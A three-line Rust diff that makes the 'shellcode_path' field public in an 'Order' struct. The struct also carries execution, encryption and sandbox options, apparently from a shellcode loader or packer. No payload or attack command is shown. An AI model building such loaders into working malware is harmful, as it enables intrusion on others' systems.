@@ -7,7 +7,7 @@ use std::str::FromStr;
 
 #[derive(Debug)]
 pub struct Order {
-    shellcode_path: PathBuf,
+    pub shellcode_path: PathBuf,
     pub execution: Execution,
     encryption: Option<Encryption>,
     sandbox: Option<bool>,
